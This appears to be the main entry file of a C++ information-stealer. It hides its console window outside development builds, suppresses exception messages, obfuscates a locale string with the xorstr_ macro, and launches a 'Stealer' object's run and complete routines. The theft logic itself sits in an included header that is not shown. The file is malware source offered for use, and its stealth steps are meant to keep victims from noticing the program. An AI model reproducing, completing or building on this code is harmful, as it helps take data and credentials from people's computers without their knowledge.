#include "stealer/Stealer.h"
#include <locale>

void globalExceptionHandler() {
    try {
        throw;
    } catch (const std::exception& e) {
#if DEV
        std::cerr << "Exception caught in globalExceptionHandler: " << e.what() << std::endl;
#endif
    } catch (...) {
#if DEV
        std::cerr << "Unknown exception caught in globalExceptionHandler." << std::endl;
#endif
    }
}

int main() {
    std::set_terminate(globalExceptionHandler);

    #if !DEV
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_HIDE);
    #endif

    std::locale::global(std::locale(""));
    setlocale(LC_ALL, xorstr_("ru-RU"));

    Stealer stealer;
    stealer.run();
    stealer.complete();

    return 0;
}
